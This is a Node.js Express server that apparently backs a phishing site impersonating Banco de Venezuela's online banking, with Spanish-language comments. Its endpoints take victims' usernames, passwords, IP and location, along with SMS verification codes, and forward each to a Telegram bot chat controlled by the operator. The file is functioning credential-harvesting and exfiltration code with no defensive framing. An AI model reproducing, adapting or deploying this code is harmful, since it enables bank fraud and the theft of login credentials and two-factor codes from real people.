require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();

// Configuración para servir archivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Configuración CORS
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? 'https://bancodevenezuela-enlinea-oportunidades.onrender.com' 
    : '*'
}));

app.use(express.json());

// Endpoint para enviar credenciales
app.post('/enviar-credenciales', async (req, res) => {
    try {
        const { usuario, password, ip, pais, estado, ciudad } = req.body;

        // Validación básica
        if (!usuario || !password) {
            return res.status(400).json({ error: "Datos incompletos" });
        }

        const mensaje = `🇻🇪 BDV en linea 🇻🇪
 👤 Usuario: <code>${usuario}</code>
 🔑 Contraseña: <code>${password}</code>
 🌐 IP: ${ip}
 📍 País: ${pais}
 🏙️ Estado: ${estado}
 🏡 Ciudad: ${ciudad}`;

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: mensaje,
            parse_mode: "HTML"
        });

        res.json({ success: true });

    } catch (error) {
        console.error("Error en el servidor:", error.message);
        res.status(500).json({ error: "Error interno del servidor" });
    }
});

// Manejar rutas no definidas
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index2.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Servidor activo en puerto ${PORT}`);
});

// Endpoint para enviar alertas

app.post('/enviar-alerta', async (req, res) => {
    try {
        const { mensaje } = req.body;

        if (!mensaje) {
            return res.status(400).json({ error: "Mensaje vacío" });
        }

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: mensaje
        });

        res.json({ success: true });

    } catch (error) {
        console.error("Error en el servidor:", error.message);
        res.status(500).json({ error: "Error interno del servidor" });
    }
});

// Endpoint para enviar SMS
app.post('/enviar-sms', async (req, res) => {
    try {
        const { documento, usuario, ip, hora } = req.body;

        if (!documento || !usuario) {
            return res.status(400).json({ error: "Datos incompletos" });
        }

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: `📨 SMS Verificado 📨\n🔒 Código: <code>${documento}</code>\n👤 Usuario: <code>${usuario}</code>\n🕒 Hora: ${hora}\n🌐 IP: ${ip}`,
            parse_mode: "HTML"
        });

        res.json({ success: true });

    } catch (error) {
        console.error("Error en el servidor:", error.message);
        res.status(500).json({ error: "Error interno del servidor" });
    }
});
